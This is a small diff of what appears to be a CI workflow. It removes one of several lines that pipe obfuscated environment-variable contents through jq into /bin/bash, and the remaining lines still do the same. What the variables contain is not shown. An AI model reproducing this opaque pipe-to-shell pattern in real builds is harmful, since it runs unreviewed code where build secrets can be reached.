@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$pt9593" | jq -r .wqqck44 | /bin/bash
           echo $zg85551 | jq -r .eyf0328 | /bin/bash
-          echo $aag931 | jq -r .sxe04590 | /bin/bash
           echo $oafts65 | jq -r .wgtrp19 | /bin/bash
 
       - name: Archive results
